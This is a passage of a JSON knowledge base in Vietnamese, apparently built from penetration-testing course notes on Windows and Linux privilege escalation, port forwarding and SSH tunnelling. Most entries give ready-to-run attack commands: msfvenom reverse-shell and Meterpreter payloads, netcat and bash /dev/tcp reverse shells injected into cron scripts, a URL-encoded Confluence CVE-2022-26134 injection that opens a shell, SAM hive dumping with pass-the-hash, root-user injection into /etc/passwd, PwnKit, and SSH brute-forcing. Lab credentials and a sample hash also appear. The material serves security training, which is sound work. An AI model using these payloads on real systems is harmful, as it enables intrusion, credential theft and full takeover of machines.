    "content": "Tìm các tác vụ đã lên lịch (Scheduled Tasks) có quyền ghi không an toàn. Kiểm tra 3 thông tin quan trọng: tài khoản thực thi (RunAs), trình kích hoạt (Trigger), và hành động (TaskToRun). Nếu tệp thực thi của tác vụ có thể bị ghi đè, hãy thay thế nó bằng payload. Dùng `schtasks /query /fo LIST /v` để liệt kê và kiểm tra.",
    "tags": [
      "theory",
      "windows",
      "privesc",
      "scheduled_tasks",
      "schtasks",
      "insecure_permissions"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "schtasks /query /fo LIST /v"
      }
    ],
    "related_cves": [],
    "source_file": "12-Windows Privilege.md"
  },
  {
    "id": "winprivesc_lab_scheduled_tasks",
    "category": "Windows Privilege",
    "title": "LAB: Abusing Scheduled Tasks",
    "content": "Sử dụng `schtasks` để tìm một tác vụ (ví dụ: `CacheCleanup` hoặc `Voice Activation`) chạy với quyền cao hơn (ví dụ: `daveadmin` hoặc `roy`) và tệp thực thi của nó nằm trong thư mục mà người dùng hiện tại có quyền ghi. Dùng `msfvenom` tạo payload, tải lên và thay thế tệp thực thi. Chờ trình kích hoạt (Trigger) (ví dụ: hàng phút hoặc khi khởi động) để nhận shell.",
    "tags": [
      "lab",
      "windows",
      "privesc",
      "scheduled_tasks",
      "schtasks",
      "insecure_permissions",
      "msfvenom",
      "reverse_shell"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=443 -f exe -o BackendCacheCleanup.exe"
      },
      {
        "language": "powershell",
        "command": "iwr -uri http://<kali_ip>:8000/BackendCacheCleanup.exe -Outfile 'C:\\Users\\steve\\Pictures\\BackendCacheCleanup.exe'"
      }
    ],
    "related_cves": [],
    "source_file": "12-Windows Privilege.md"
  },
  {
    "id": "winprivesc_exploits_theory",
    "category": "Windows Privilege",
    "title": "Abusing Other Windows Components: Using Exploits",
    "content": "Leo thang đặc quyền bằng cách khai thác lỗ hổng kernel Windows hoặc lạm dụng các đặc quyền (Privileges) của Windows. Đặc quyền `SeImpersonatePrivilege` rất đáng chú ý, có thể bị lạm dụng bằng các công cụ như `PrintSpoofer`, `SigmaPotato`, `Juicy Potato`. Các đặc quyền khác có thể khai thác bao gồm `SeBackupPrivilege`, `SeLoadDriver`, `SeDebug`.",
    "tags": [
      "theory",
      "windows",
      "privesc",
      "kernel_exploit",
      "privilege_abuse",
      "seimpersonateprivilege",
      "sebackupprivilege",
      "juicy_potato",
      "sigmapotato",
      "printspoofer"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "12-Windows Privilege.md"
  },
  {
    "id": "winprivesc_lab_exploit_seimpersonate",
    "category": "Windows Privilege",
    "title": "LAB: Abusing SeImpersonatePrivilege (SigmaPotato)",
    "content": "Từ shell 'dave', dùng `whoami /priv` để xác nhận `SeImpersonatePrivilege` đã được bật. Tải lên `SigmaPotato.exe`. Sử dụng `SigmaPotato` để thực thi lệnh với quyền SYSTEM, ví dụ như thêm người dùng mới (`dave4`) vào nhóm `Remote Management Users`. Sau đó, dùng `evil-winrm` để đăng nhập với tư cách `dave4`.",
    "tags": [
      "lab",
      "windows",
      "privesc",
      "privilege_abuse",
      "seimpersonateprivilege",
      "sigmapotato",
      "evil-winrm",
      "whoami_priv"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "whoami /priv"
      },
      {
        "language": "powershell",
        "command": ".\\SigmaPotato \"net user dave4 lab /add\""
      },
      {
        "language": "powershell",
        "command": ".\\SigmaPotato \"cmd /c C:\\Users\\dave\\add-user.bat\""
      }
    ],
    "related_cves": [],
    "source_file": "12-Windows Privilege.md"
  },
  {
    "id": "winprivesc_lab_capstone",
    "category": "Windows Privilege",
    "title": "LAB Capstone: Windows Multi-Step Privesc",
    "content": "Một chuỗi leo thang đặc quyền nhiều bước:\n1. (diana shell): `Get-ChildItem` tìm thấy creds của `alex` (RDP).\n2. (alex RDP): Tải lên `WinPEAS`, phát hiện DLL Hijacking trong `EnterpriseService` (thư mục `C:\\Services` có thể ghi). Log file tiết lộ `EnterpriseServiceOptional.dll`.\n3. (alex RDP): Dùng `msfvenom` tạo `shell.dll` (Meterpreter), đổi tên thành `EnterpriseServiceOptional.dll`, tải lên `C:\\Services`. Khởi động lại dịch vụ.\n4. (enterpriseuser shell): Nhận shell Meterpreter. `whoami /priv` thấy user thuộc `Backup Operators` (có `SeBackupPrivilege`).\n5. (enterpriseuser shell): Dùng `reg save` để dump các hive HKLM\\SAM và HKLM\\SYSTEM.\n6. (Kali): Tải các hive về. Dùng `impacket-secretsdump` để trích xuất hash NTLM của Administrator.\n7. (Kali): Dùng `evil-winrm` với hash của Administrator (Pass the Hash) để lấy shell SYSTEM.",
    "tags": [
      "lab",
      "capstone",
      "windows",
      "privesc",
      "credential_hunting",
      "dll_hijacking",
      "winpeas",
      "msfvenom",
      "meterpreter",
      "sebackupprivilege",
      "reg_save",
      "sam_dump",
      "impacket-secretsdump",
      "pass_the_hash",
      "pth",
      "evil-winrm"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=5555 -f dll -o shell.dll"
      },
      {
        "language": "powershell",
        "command": "reg save hklm\\sam C:\\temp\\sam.hive"
      },
      {
        "language": "powershell",
        "command": "reg save hklm\\system C:\\temp\\system.hive"
      },
      {
        "language": "bash",
        "command": "impacket-secretsdump -sam sam.hive -system system.hive LOCAL"
      },
      {
        "language": "bash",
        "command": "evil-winrm -i <target_ip> -u \"Administrator\" -H \"8f518eb35353d7a83d27e7fe457664e5\""
      }
    ],
    "related_cves": [],
    "source_file": "12-Windows Privilege.md"
  },
  {
    "id": "linuxprivesc_enum_manual",
    "category": "Linux Privilege",
    "title": "Enumerating Linux: Manual Enumeration",
    "content": "Các lệnh cơ bản để thu thập thông tin hệ thống Linux: `id`, `whoami`, `cat /etc/passwd`, `hostname`, `uname -a`, `ps aux`, `ip a`, `netstat -antp`, `ss -anp`, `iptables`, `ls -lah /etc/cron*`, `dpkg -l` (Debian), `rpm -qa` (RHEL), `find / -perm -4000` (SUID), `find / -writable`, `cat /etc/fstab`, `lsmod`. Lý thuyết về SUID/SGID.",
    "tags": [
      "linux",
      "privesc",
      "enumeration",
      "manual_enum",
      "id",
      "uname",
      "ps",
      "netstat",
      "cron",
      "find",
      "suid",
      "sgid"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "cat /etc/passwd"
      },
      {
        "language": "bash",
        "command": "ps aux"
      },
      {
        "language": "bash",
        "command": "netstat -antp"
      },
      {
        "language": "bash",
        "command": "find / -perm -4000 -type f 2>/dev/null"
      },
      {
        "language": "bash",
        "command": "ls -lah /etc/cron*"
      }
    ],
    "related_cves": [],
    "source_file": "13-Linux Privilege.md"
  },
  {
    "id": "linuxprivesc_enum_automated",
    "category": "Linux Privilege",
    "title": "Enumerating Linux: Automated Enumeration",
    "content": "Sử dụng các script tự động để quét các vectơ leo thang đặc quyền, ví dụ: `unix-privesc-check`, `linpeas`, `LinEnum`.",
    "tags": [
      "linux",
      "privesc",
      "enumeration",
      "automated_enum",
      "linpeas",
      "linenum",
      "unix-privesc-check",
      "tool"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "./unix-privesc-check standard > output.txt"
      }
    ],
    "related_cves": [],
    "source_file": "13-Linux Privilege.md"
  },
  {
    "id": "linuxprivesc_enum_user_trials",
    "category": "Linux Privilege",
    "title": "Enumerating Linux: Inspecting User Trials",
    "content": "Kiểm tra các tệp cấu hình và biến môi trường của người dùng để tìm thông tin nhạy cảm. Dùng `env`, `cat .bashrc`. Kiểm tra quyền sudo bằng `sudo -l`. Có thể dùng `crunch` tạo wordlist và `hydra` để brute-force SSH.",
    "tags": [
      "linux",
      "privesc",
      "enumeration",
      "credential_hunting",
      "env",
      "bashrc",
      "sudo",
      "hydra",
      "crunch"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "env"
      },
      {
        "language": "bash",
        "command": "sudo -l"
      },
      {
        "language": "bash",
        "command": "crunch 6 6 -t Lab%%% > wordlist"
      },
      {
        "language": "bash",
        "command": "hydra -l eve -P wordlist  <target_ip> -t 4 ssh -V"
      }
    ],
    "related_cves": [],
    "source_file": "13-Linux Privilege.md"
  },
  {
    "id": "linuxprivesc_enum_service_footprints",
    "category": "Linux Privilege",
    "title": "Enumerating Linux: Inspecting Service Footprints",
    "content": "Theo dõi các tiến trình đang chạy để tìm mật khẩu (ví dụ: `watch ps ... | grep pass`) hoặc nghe lén lưu lượng mạng (đặc biệt là loopback) bằng `tcpdump` (cần sudo) để bắt thông tin đăng nhập.",
    "tags": [
      "linux",
      "privesc",
      "enumeration",
      "credential_hunting",
      "process_monitoring",
      "tcpdump",
      "watch"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "watch -n 1 \"ps -aux | grep pass\""
      },
      {
        "language": "bash",
        "command": "sudo tcpdump -i lo -A | grep \"pass\""
      }
    ],
    "related_cves": [],
    "source_file": "13-Linux Privilege.md"
  },
  {
    "id": "linuxprivesc_cron_job_abuse",
    "category": "Linux Privilege",
    "title": "Insecure File Permissions: Abuse Cron Jobs",
    "content": "Kiểm tra các cron job (`/var/log/syslog`, `/etc/crontab`). Nếu một cron job chạy với quyền root (hoặc user khác) thực thi một script mà người dùng hiện tại có quyền ghi, kẻ tấn công có thể chèn payload (ví dụ: reverse shell) vào script đó.",
    "tags": [
      "linux",
      "privesc",
      "cron",
      "insecure_permissions",
      "reverse_shell"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "grep \"CRON\" /var/log/syslog"
      },
      {
        "language": "bash",
        "command": "ls -lah /home/joe/.scripts/user_backups.sh"
      },
      {
        "language": "bash",
        "command": "echo \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <kali_ip> 1234 >/tmp/f\" >> user_backups.sh"
      }
    ],
    "related_cves": [],
    "source_file": "13-Linux Privilege.md"
  },
  {
    "id": "linuxprivesc_lab_cron_job_capstone",
    "category": "Linux Privilege",
    "title": "LAB Capstone: Cron Job Abuse (pspy)",
    "content": "Sử dụng `pspy` để theo dõi các tiến trình. Phát hiện một script (`/var/archives/archive.sh`) được chạy bởi UID=0 (root) mỗi phút. Kiểm tra quyền của script (`ls -lah`) và thấy nó có thể bị ghi bởi mọi người. Chèn (`echo`) một payload reverse shell `bash -i` vào script. Mở trình nghe `nc` và chờ shell.",
    "tags": [
      "lab",
      "capstone",
      "linux",
      "privesc",
      "cron",
      "pspy",
      "insecure_permissions",
      "reverse_shell",
      "bash",
      "nc"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "./pspy64"
      },
      {
        "language": "bash",
        "command": "ls -lah /var/archives/archive.sh"
      },
      {
        "language": "bash",
        "command": "echo \"bash -i >& /dev/tcp/<kali_ip>/4444 0>&1\" >> /var/archives/archive.sh"
      },
      {
        "language": "bash",
        "command": "nc -lvnp 4444"
      }
    ],
    "related_cves": [],
    "source_file": "13-Linux Privilege.md"
  },
  {
    "id": "linuxprivesc_passwd_abuse",
    "category": "Linux Privilege",
    "title": "Insecure File Permissions: Abusing /etc/passwd",
    "content": "Nếu tệp `/etc/passwd` có quyền ghi, kẻ tấn công có thể thêm một người dùng mới với UID 0 (quyền root). Sử dụng `openssl passwd` để tạo hash mật khẩu, sau đó `echo` một dòng mới vào `/etc/passwd`.",
    "tags": [
      "linux",
      "privesc",
      "insecure_permissions",
      "etc_passwd",
      "writable_passwd",
      "uid_0",
      "openssl"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "openssl passwd w00t"
      },
      {
        "language": "bash",
        "command": "echo \"root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash\" >> /etc/passwd"
      }
    ],
    "related_cves": [],
    "source_file": "13-Linux Privilege.md"
  },
  {
    "id": "linuxprivesc_lab_passwd_abuse_capstone",
    "category": "Linux Privilege",
    "title": "LAB Capstone: Abusing Writable /etc/passwd",
    "content": "Sử dụng `find / -writable -type f` để phát hiện `/etc/passwd` có thể ghi. Tạo hash bằng `openssl passwd`. Thêm một người dùng mới (ví dụ: `root2`) với UID 0 vào tệp `/etc/passwd`. Sử dụng `su root2` để chuyển sang người dùng root mới.",
    "tags": [
      "lab",
      "capstone",
      "linux",
      "privesc",
      "insecure_permissions",
      "etc_passwd",
      "writable_passwd",
      "openssl",
      "su"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "find / -writable -type f 2>/dev/null"
      },
      {
        "language": "bash",
        "command": "echo \"root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash\" >> /etc/passwd"
      },
      {
        "language": "bash",
        "command": "su root2"
      }
    ],
    "related_cves": [],
    "source_file": "13-Linux Privilege.md"
  },
  {
    "id": "linuxprivesc_suid_capabilities_abuse",
    "category": "Linux Privilege",
    "title": "Insecure System Components: Abusing SUID/Capabilities",
    "content": "Tìm các tệp nhị phân có SUID (`find / -perm -4000`) hoặc Capabilities (`/usr/sbin/getcap -r /`). Tra cứu các tệp nhị phân này trên GTFOBins để tìm các payload leo thang đặc quyền.",
    "tags": [
      "linux",
      "privesc",
      "suid",
      "capabilities",
      "find",
      "getcap",
      "gtfobins"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "find / -perm -4000 -type f 2>/dev/null"
      },
      {
        "language": "bash",
        "command": "/usr/sbin/getcap -r / 2>/dev/null"
      }
    ],
    "related_cves": [],
    "source_file": "13-Linux Privilege.md"
  },
  {
    "id": "linuxprivesc_lab_capabilities_gdb",
    "category": "Linux Privilege",
    "title": "LAB: Abusing Capabilities (gdb)",
    "content": "Sử dụng `getcap` phát hiện `gdb` có capability `cap_setuid+ep`. Tra cứu GTFOBins, tìm payload `gdb` để chạy Python, gọi `os.setuid(0)`, và mở shell (`!sh`).",
    "tags": [
      "lab",
      "linux",
      "privesc",
      "capabilities",
      "gdb",
      "cap_setuid",
      "gtfobins",
      "python"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "/usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"
      }
    ],
    "related_cves": [],
    "source_file": "13-Linux Privilege.md"
  },
  {
    "id": "linuxprivesc_lab_suid_find_capstone",
    "category": "Linux Privilege",
    "title": "LAB Capstone: Abusing SUID (find)",
    "content": "Sử dụng `find / -perm -u=s` để phát hiện `/usr/bin/find` có SUID. Tra cứu GTFOBins, tìm payload SUID cho `find`: thực thi một shell (`/bin/sh -p`) và thoát.",
    "tags": [
      "lab",
      "capstone",
      "linux",
      "privesc",
      "suid",
      "find",
      "gtfobins"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "find / -perm -u=s -type f 2>/dev/null"
      },
      {
        "language": "bash",
        "command": "/usr/bin/find . -exec /bin/sh -p \\; -quit"
      }
    ],
    "related_cves": [],
    "source_file": "13-Linux Privilege.md"
  },
  {
    "id": "linuxprivesc_sudo_abuse",
    "category": "Linux Privilege",
    "title": "Insecure System Components: Abusing Sudo",
    "content": "Sử dụng `sudo -l` để liệt kê các lệnh mà người dùng hiện tại có thể chạy với quyền sudo. Tra cứu các lệnh đó trên GTFOBins để tìm cách lạm dụng chúng để có shell root. Lưu ý AppArmor có thể ngăn chặn một số kỹ thuật.",
    "tags": [
      "linux",
      "privesc",
      "sudo",
      "sudo_l",
      "gtfobins",
      "apparmor"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "sudo -l"
      }
    ],
    "related_cves": [],
    "source_file": "13-Linux Privilege.md"
  },
  {
    "id": "linuxprivesc_lab_sudo_gcc",
    "category": "Linux Privilege",
    "title": "LAB: Abusing Sudo (gcc)",
    "content": "Lệnh `sudo -l` cho thấy người dùng có thể chạy `/usr/bin/gcc` với sudo. Tra cứu GTFOBins, tìm payload sudo cho `gcc` để sử dụng cờ `-wrapper` nhằm thực thi `/bin/sh`.",
    "tags": [
      "lab",
      "linux",
      "privesc",
      "sudo",
      "sudo_l",
      "gcc",
      "gtfobins"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "sudo gcc -wrapper /bin/sh,-s ."
      }
    ],
    "related_cves": [],
    "source_file": "13-Linux Privilege.md"
  },
  {
    "id": "linuxprivesc_kernel_exploit",
    "category": "Linux Privilege",
    "title": "Insecure System Components: Abusing Kernel Exploits",
    "content": "Thu thập thông tin phiên bản hệ điều hành và kernel (`uname -a`, `cat /etc/issue`, `arch`). Sử dụng `searchsploit` để tìm các exploit leo thang đặc quyền cục bộ (Local Privilege Escalation) cho phiên bản kernel đó. Tải mã nguồn exploit (`.c`), chuyển sang máy nạn nhân (`scp`), biên dịch (`gcc`), và thực thi.",
    "tags": [
      "linux",
      "privesc",
      "kernel_exploit",
      "enumeration",
      "uname",
      "searchsploit",
      "lpe",
      "gcc"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "uname -a"
      },
      {
        "language": "bash",
        "command": "searchsploit \"linux kernel Ubuntu 16 Local Privilege Escalation\"   | grep  \"4.\" | grep -v \" < 4.4.0\" | grep -v \"4.8\""
      },
      {
        "language": "bash",
        "command": "cp /usr/share/exploitdb/exploits/linux/local/45010.c ."
      },
      {
        "language": "bash",
        "command": "gcc cve-2017-16995.c -o cve-2017-16995"
      },
      {
        "language": "bash",
        "command": "./cve-2017-16995"
      }
    ],
    "related_cves": [
      "CVE-2017-16995"
    ],
    "source_file": "13-Linux Privilege.md"
  },
  {
    "id": "linuxprivesc_lab_kernel_exploit_pkexec_capstone",
    "category": "Linux Privilege",
    "title": "LAB Capstone: Kernel Exploit (PwnKit CVE-2021-4034)",
    "content": "Thực hiện enumeration thủ công (`uname -a`) và tự động (`linpeas`). Phát hiện tệp SUID `/usr/bin/pkexec`. Linpeas gợi ý `CVE-2021-4034` (PwnKit). Tải xuống tệp exploit PwnKit (dùng `curl`), chuyển sang máy nạn nhân, `chmod +x` và thực thi để có shell root.",
    "tags": [
      "lab",
      "capstone",
      "linux",
      "privesc",
      "kernel_exploit",
      "pkexec",
      "pwnkit",
      "cve",
      "linpeas",
      "suid"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "find / -perm -u=s -type f 2>/dev/null"
      },
      {
        "language": "bash",
        "command": "curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit"
      },
      {
        "language": "bash",
        "command": "chmod +x PwnKit"
      },
      {
        "language": "bash",
        "command": "./PwnKit"
      }
    ],
    "related_cves": [
      "CVE-2021-4034",
      "CVE-2019-13272",
      "CVE-2011-1485"
    ],
    "source_file": "13-Linux Privilege.md"
  },
  {
    "id": "portfwd_linux_socat",
    "category": "Port Redirection and SSH Tunneling",
    "title": "Port Forwarding with Linux Tools: Socat",
    "content": "Sử dụng `socat` để chuyển tiếp cổng. Lấy reverse shell vào máy trung gian (Confluence). Trên máy trung gian, chạy `socat` để lắng nghe trên một cổng (ví dụ: 2345) và chuyển tiếp lưu lượng đến IP và cổng của máy đích trong mạng nội bộ (ví dụ: 10.4.174.215:5432).",
    "tags": [
      "pivoting",
      "port_forwarding",
      "socat",
      "linux",
      "reverse_shell"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "socat -ddd TCP-LISTEN:2345,fork TCP:<target_ip_internal>:5432"
      }
    ],
    "related_cves": [],
    "source_file": "14-Port Redirection and SSH Tunneling.md"
  },
  {
    "id": "portfwd_lab_socat_db_ssh",
    "category": "Port Redirection and SSH Tunneling",
    "title": "LAB: Port Forwarding with Socat (DB and SSH)",
    "content": "Lấy reverse shell vào máy Confluence (CVE-2022-26134). Tìm creds DB (postgres) từ tệp config. Dùng `socat` để chuyển tiếp cổng 5432 của PGDATABASE01 sang cổng 2345 của Confluence. Từ Kali, kết nối `psql` qua máy Confluence (cổng 2345), dump bảng user, crack hash (dùng `hashcat -m 12001`). Dùng creds `database_admin:sqlpass123` tìm được, tạo một `socat` forwarder khác cho SSH (cổng 22) và SSH vào PGDATABASE01.",
    "tags": [
      "lab",
      "pivoting",
      "port_forwarding",
      "socat",
      "linux",
      "cve",
      "reverse_shell",
      "confluence",
      "postgresql",
      "psql",
      "hashcat",
      "ssh"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "curl http://<target_ip>:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/<kali_ip>/4444%200%3E%261%27%29.start%28%29%22%29%7D/"
      },
      {
        "language": "bash",
        "command": "socat -ddd TCP-LISTEN:2345,fork TCP:<target_ip_internal_db>:5432"
      },
      {
        "language": "bash",
        "command": "psql -h <target_ip_confluence> -p 2345 -U postgres"
      },
      {
        "language": "bash",
        "command": "socat TCP-LISTEN:2222,fork TCP:<target_ip_internal_db>:22"
      },
      {
        "language": "bash",
        "command": "ssh database_admin@<target_ip_confluence> -p 2222"
      }
    ],
    "related_cves": [
      "CVE-2022-26134"
    ],
    "source_file": "14-Port Redirection and SSH Tunneling.md"
  },
  {
    "id": "ssh_tunnel_local_port_forwarding",
    "category": "Port Redirection and SSH Tunneling",
    "title": "SSH Tunneling: Local Port Forwarding (-L)",
    "content": "Sử dụng SSH Local Port Forwarding (`ssh -N -L ...`) để chuyển tiếp một cổng từ máy local (hoặc máy trung gian) đến một máy đích trong mạng nội bộ. Lệnh được chạy trên máy client (máy trung gian trong kịch bản reverse shell).",
    "tags": [
      "theory",
      "pivoting",
      "ssh_tunneling",
      "local_port_forwarding",
      "ssh_l"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "ssh -N -L 0.0.0.0:4455:<target_ip_internal_smb>:445 database_admin@<target_ip_internal_db>"
      }
    ],
    "related_cves": [],
    "source_file": "14-Port Redirection and SSH Tunneling.md"
  },
  {
    "id": "ssh_tunnel_lab_local_port_forwarding",
    "category": "Port Redirection and SSH Tunneling",
    "title": "LAB: SSH Local Port Forwarding (-L)",
    "content": "Có reverse shell trên Confluence. SSH từ Confluence vào PGDATABASE01. Từ PGDATABASE01, quét mạng 172.16.50.0/24 và tìm thấy cổng 445 (SMB) mở trên 172.16.244.217. Quay lại shell Confluence, chạy `ssh -N -L 0.0.0.0:4455:172.16.244.217:445 database_admin@10.4.244.215` để tạo một local forwarder. Từ Kali, dùng `smbclient` kết nối đến IP của Confluence (192.168.244.63) trên cổng 4455 để truy cập SMB share trên máy 172.16.244.217.",
    "tags": [
      "lab",
      "pivoting",
      "ssh_tunneling",
      "local_port_forwarding",
      "ssh_l",
      "smbclient",
      "multi_hop"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done"
      },
      {
        "language": "bash",
        "command": "ssh -N -L 0.0.0.0:4455:<target_ip_internal_smb>:445 database_admin@<target_ip_internal_db>"
      },
      {
        "language": "bash",
        "command": "smbclient -p 4455 -L //<target_ip_confluence>/ -U hr_admin --password=Welcome1234"
      }
    ],
    "related_cves": [],
    "source_file": "14-Port Redirection and SSH Tunneling.md"
  },
  {
    "id": "ssh_tunnel_dynamic_port_forwarding",
    "category": "Port Redirection and SSH Tunneling",
    "title": "SSH Tunneling: Dynamic Port Forwarding (-D)",
    "content": "Sử dụng SSH Dynamic Port Forwarding (`ssh -N -D ...`) để tạo một SOCKS proxy trên máy client (máy trung gian). Lệnh này mở một cổng (ví dụ: 9999) trên máy trung gian, cho phép máy tấn công (Kali) định tuyến lưu lượng qua nó.",
    "tags": [
      "theory",
      "pivoting",
      "ssh_tunneling",
      "dynamic_port_forwarding",
      "ssh_d",
      "socks_proxy"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "ssh -N -D 0.0.0.0:9999 database_admin@<target_ip_internal_db>"
      }
    ],
    "related_cves": [],
    "source_file": "14-Port Redirection and SSH Tunneling.md"
  },
  {
    "id": "ssh_tunnel_lab_dynamic_port_forwarding",
    "category": "Port Redirection and SSH Tunneling",
    "title": "LAB: SSH Dynamic Port Forwarding (-D) with Proxychains",
    "content": "Có reverse shell trên Confluence. Chạy `ssh -N -D 0.0.0.0:9999 database_admin@10.4.244.215` trên Confluence để tạo SOCKS proxy. Trên Kali, sửa tệp `/etc/proxychains.conf` để trỏ đến proxy (`socks5 192.168.244.63 9999`). Sử dụng `proxychains` để chạy các công cụ (như `smbclient`, `nmap`) qua tunnel để truy cập vào mạng 172.16.x.x.",
    "tags": [
      "lab",
      "pivoting",
      "ssh_tunneling",
      "dynamic_port_forwarding",
      "ssh_d",
      "socks_proxy",
      "proxychains",
      "nmap",
      "smbclient"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "ssh -N -D 0.0.0.0:9999 database_admin@<target_ip_internal_db>"
      },
      {
        "language": "text",
        "command": "socks5 <target_ip_confluence> 9999"
      },
      {
        "language": "bash",
        "command": "proxychains smbclient -L //<target_ip_internal_smb>/ -U hr_admin --password=Welcome1234"
      },
      {
        "language": "bash",
        "command": "proxychains nmap -vvv -sT -p4870-4880 -Pn <target_ip_internal_smb>"
      }
    ],
    "related_cves": [],
    "source_file": "14-Port Redirection and SSH Tunneling.md"
  },
  {
    "id": "ssh_tunnel_remote_port_forwarding",
    "category": "Port Redirection and SSH Tunneling",
    "title": "SSH Tunneling: Remote Port Forwarding (-R)",
    "content": "Sử dụng SSH Remote Port Forwarding (`ssh -N -R ...`) để chuyển tiếp một cổng từ máy chủ SSH (máy tấn công) đến một máy đích trong mạng nội bộ của client (máy trung gian). Lệnh được chạy trên máy client (máy trung gian).",
    "tags": [
      "theory",
      "pivoting",
      "ssh_tunneling",
      "remote_port_forwarding",
      "ssh_r"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "ssh -N -R 127.0.0.1:2345:<target_ip_internal_db>:5432 kali@<kali_ip>"
      }
    ],
    "related_cves": [],
    "source_file": "14-Port Redirection and SSH Tunneling.md"
  },
  {
    "id": "ssh_tunnel_lab_remote_port_forwarding",
    "category": "Port Redirection and SSH Tunneling",
    "title": "LAB: SSH Remote Port Forwarding (-R)",
    "content": "Trên Kali, khởi động SSH server (`sudo systemctl start ssh`). Có reverse shell trên Confluence. Từ shell Confluence, chạy `ssh -N -R 127.0.0.1:2345:10.4.244.215:5432 kali@192.168.45.184`. Lệnh này kết nối đến SSH server của Kali và tạo một tunnel. Giờ đây, trên máy Kali, có thể kết nối đến `127.0.0.1:2345` (ví dụ: dùng `psql`) để truy cập dịch vụ (DB) trên máy PGDATABASE01.",
    "tags": [
      "lab",
      "pivoting",
      "ssh_tunneling",
      "remote_port_forwarding",
      "ssh_r",
      "psql"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "sudo systemctl start ssh"
      },
      {
        "language": "bash",
        "command": "ssh -N -R 127.0.0.1:2345:<target_ip_internal_db>:5432 kali@<kali_ip>"
      },
      {
        "language": "bash",
        "command": "psql -h 127.0.0.1 -p 2345 -U postgres -d hr_backup"
      }
    ],
    "related_cves": [],
    "source_file": "14-Port Redirection and SSH Tunneling.md"
  },
  {
    "id": "ssh_tunnel_remote_dynamic_port_forwarding",
    "category": "Port Redirection and SSH Tunneling",
    "title": "SSH Tunneling: Remote Dynamic Port Forwarding (-R + SOCKS)",
    "content": "Kết hợp SSH Remote Forwarding để tạo một SOCKS proxy trên máy chủ SSH (máy tấn công). Lệnh `ssh -N -R 9998 kali@...` chạy trên máy client (máy trung gian) sẽ tạo một SOCKS proxy trên máy Kali tại cổng 9998, cho phép Kali dùng `proxychains` để truy cập mạng nội bộ của máy trung gian.",
    "tags": [
      "theory",
      "pivoting",
      "ssh_tunneling",
      "remote_port_forwarding",
      "dynamic_port_forwarding",
      "ssh_r",
      "socks_proxy",
      "proxychains"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "ssh -N -R 9998 kali@<kali_ip>"
      },
      {
        "language": "text",
        "command": "socks5 127.0.0.1 9998"
      }
    ],
    "related_cves": [],
    "source_file": "14-Port Redirection and SSH Tunneling.md"
  },
  {
    "id": "ssh_tunnel_sshuttle",
    "category": "Port Redirection and SSH Tunneling",
    "title": "SSH Tunneling: sshuttle",
    "content": "`sshuttle` là một công cụ tạo tunnel hoạt động như một VPN \"nghèo\", chuyển tiếp lưu lượng qua SSH. Yêu cầu quyền root và Python3 trên client. Lệnh `sshuttle -r user@host:port <subnet1> <subnet2>` sẽ định tuyến lưu lượng cho các mạng con (subnet) được chỉ định qua tunnel.",
    "tags": [
      "pivoting",
      "ssh_tunneling",
      "sshuttle",
      "tool",
      "vpn",
      "python3"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "sshuttle -r database_admin@<target_ip_confluence>:2222 10.4.50.0/24 172.16.50.0/24"
      }
    ],
    "related_cves": [],
    "source_file": "14-Port Redirection and SSH Tunneling.md"
  },
  {
    "id": "portfwd_windows_ssh_exe",
    "category": "Port Redirection and SSH Tunneling",
    "title": "Port Forwarding with Windows Tools: ssh.exe",
    "content": "Sử dụng `ssh.exe` có sẵn trên Windows (hoặc được tải lên) để thực hiện các kỹ thuật SSH tunneling, ví dụ như Remote Dynamic Port Forwarding (`ssh -N -R 9998 kali@...`) để tạo SOCKS proxy trên máy Kali.",
    "tags": [
      "pivoting",
      "port_forwarding",
      "ssh_tunneling",
      "windows",
      "ssh.exe",
      "remote_port_forwarding",
      "dynamic_port_forwarding"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "ssh -N -R 9998 kali@<kali_ip>"
      }
    ],
    "related_cves": [],
    "source_file": "14-Port Redirection and SSH Tunneling.md"
  },
  {
    "id": "portfwd_windows_plink",
    "category": "Port Redirection and SSH Tunneling",
